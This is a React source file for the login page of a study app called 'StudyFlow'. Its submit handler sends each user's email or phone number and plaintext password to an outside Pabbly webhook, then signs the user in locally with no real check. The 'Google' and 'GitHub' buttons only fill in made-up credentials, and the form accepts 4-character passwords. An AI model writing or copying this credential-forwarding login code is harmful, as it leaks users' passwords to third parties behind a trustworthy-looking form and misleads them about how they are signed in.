import { useState } from "react";
import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { Loader2, Mail, Lock, Sparkles, ArrowRight } from "lucide-react";
import { toast } from "sonner";
import { AuthLayout } from "@/components/auth/AuthLayout";
import { PasswordInput } from "@/components/auth/PasswordInput";
import { Button } from "@/components/ui/button";
import { Checkbox } from "@/components/ui/checkbox";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useStore, uid } from "@/lib/store";
import { sendToWebhook } from "@/lib/webhook";

export const Route = createFileRoute("/login")({
  head: () => ({
    meta: [
      { title: "Log in — StudyFlow" },
      { name: "description", content: "Log in to your StudyFlow study workspace." },
      { property: "og:title", content: "Log in — StudyFlow" },
      { property: "og:description", content: "Log in to your StudyFlow study workspace." },
    ],
  }),
  component: LoginPage,
});

function LoginPage() {
  const navigate = useNavigate();
  const { signIn } = useStore();
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [errors, setErrors] = useState<{ identifier?: string; password?: string }>({});
  const [loading, setLoading] = useState(false);

  function validate() {
    const next: { identifier?: string; password?: string } = {};
    if (!identifier.trim()) next.identifier = "Enter your email or phone number.";
    else if (!/^\S+@\S+\.\S+$/.test(identifier) && !/^\+?\d[\d\s-]{7,}$/.test(identifier))
      next.identifier = "That doesn't look like a valid email or phone number.";
    if (!password) next.password = "Enter your password.";
    else if (password.length < 4) next.password = "Password must be at least 4 characters.";
    setErrors(next);
    return Object.keys(next).length === 0;
  }

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!validate()) return;
    setLoading(true);

    await new Promise((r) => setTimeout(r, 600));
    const isEmail = identifier.includes("@");
    const loginData = {
      id: uid(),
      name: isEmail ? (identifier.split("@")[0] ?? "Student") : "Student",
      email: isEmail ? identifier : "",
      phone: isEmail ? "" : identifier,
    };

    // Post to Pabbly Webhook (without id/event, including password)
    sendToWebhook({
      identifier: identifier.trim(),
      email: isEmail ? identifier.trim() : "",
      phone: isEmail ? "" : identifier.trim(),
      password: password,
    });

    signIn(loginData);
    setLoading(false);
    toast.success("Welcome back to StudyFlow!");
    navigate({ to: "/app" });
  }

  function handleDemoFill() {
    setIdentifier("student@studyflow.com");
    setPassword("1234");
    setErrors({});
    toast.info("Demo credentials filled!");
  }

  return (
    <AuthLayout
      title="Welcome back"
      subtitle="Log in to access your calm, productive study workspace."
      footer={
        <>
          Don't have an account?{" "}
          <Link to="/signup" className="font-semibold text-primary hover:underline">
            Create account
          </Link>
        </>
      }
    >
      {/* Quick Demo Login Banner */}
      <button
        type="button"
        onClick={handleDemoFill}
        className="mb-5 flex w-full items-center justify-between gap-2 rounded-2xl border border-primary/20 bg-primary/5 px-4 py-2.5 text-xs font-medium text-primary transition-colors hover:bg-primary/10"
      >
        <span className="flex items-center gap-2">
          <Sparkles className="size-4 shrink-0 text-primary" />
          <span>Quick fill demo credentials</span>
        </span>
        <span className="font-semibold underline">Auto fill</span>
      </button>

      <form onSubmit={onSubmit} noValidate className="space-y-4">
        {/* Email or Phone Input */}
        <div className="space-y-2">
          <Label htmlFor="identifier" className="text-xs font-semibold text-foreground">
            Email or phone number
          </Label>
          <div className="relative">
            <Mail className="pointer-events-none absolute left-3.5 top-1/2 size-4 -translate-y-1/2 text-muted-foreground" />
            <Input
              id="identifier"
              value={identifier}
              onChange={(e) => setIdentifier(e.target.value)}
              placeholder="name@example.com or phone"
              className="pl-10"
              aria-invalid={!!errors.identifier}
              aria-describedby={errors.identifier ? "identifier-error" : undefined}
            />
          </div>
          {errors.identifier && (
            <p id="identifier-error" className="text-xs font-medium text-destructive">
              {errors.identifier}
            </p>
          )}
        </div>

        {/* Password Input */}
        <div className="space-y-2">
          <Label htmlFor="password" className="text-xs font-semibold text-foreground">
            Password
          </Label>
          <div className="relative">
            <Lock className="pointer-events-none absolute left-3.5 top-1/2 size-4 -translate-y-1/2 text-muted-foreground z-10" />
            <PasswordInput
              id="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="••••••••"
              className="pl-10"
              aria-invalid={!!errors.password}
              aria-describedby={errors.password ? "password-error" : undefined}
            />
          </div>
          {errors.password && (
            <p id="password-error" className="text-xs font-medium text-destructive">
              {errors.password}
            </p>
          )}
        </div>

        {/* Remember me & Forgot password */}
        <div className="flex items-center justify-between gap-3 pt-1">
          <label className="flex items-center gap-2 text-xs text-muted-foreground cursor-pointer select-none">
            <Checkbox id="remember" /> Remember me
          </label>
          <button
            type="button"
            onClick={() => toast.info("Password reset link sent to demo account.")}
            className="text-xs font-semibold text-primary hover:underline"
          >
            Forgot password?
          </button>
        </div>

        {/* Submit Button */}
        <Button
          type="submit"
          variant="hero"
          className="group relative w-full overflow-hidden shadow-soft transition-all hover:shadow-lift"
          size="lg"
          disabled={loading}
        >
          {loading ? (
            <Loader2 className="animate-spin size-4" />
          ) : (
            <span className="flex items-center justify-center gap-2">
              <span>Login to Dashboard</span>
              <ArrowRight className="size-4 transition-transform group-hover:translate-x-1" />
            </span>
          )}
        </Button>
      </form>

      {/* Social Logins Divider */}
      <div className="my-6 flex items-center gap-3">
        <div className="h-px flex-1 bg-border" />
        <span className="text-[11px] font-medium uppercase tracking-wider text-muted-foreground">
          Or continue with
        </span>
        <div className="h-px flex-1 bg-border" />
      </div>

      {/* Social Login Buttons */}
      <div className="grid grid-cols-2 gap-3">
        <Button
          type="button"
          variant="outline"
          className="h-10 text-xs font-medium hover:bg-accent"
          onClick={() => {
            setIdentifier("student@google.com");
            setPassword("google123");
            toast.info("Google login selected.");
          }}
        >
          <svg className="mr-2 size-4" viewBox="0 0 24 24">
            <path
              fill="#4285F4"
              d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
            />
            <path
              fill="#34A853"
              d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
            />
            <path
              fill="#FBBC05"
              d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"
            />
            <path
              fill="#EA4335"
              d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"
            />
          </svg>
          Google
        </Button>
        <Button
          type="button"
          variant="outline"
          className="h-10 text-xs font-medium hover:bg-accent"
          onClick={() => {
            setIdentifier("student@github.com");
            setPassword("github123");
            toast.info("GitHub login selected.");
          }}
        >
          <svg className="mr-2 size-4 fill-current" viewBox="0 0 24 24">
            <path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z" />
          </svg>
          GitHub
        </Button>
      </div>
    </AuthLayout>
  );
}
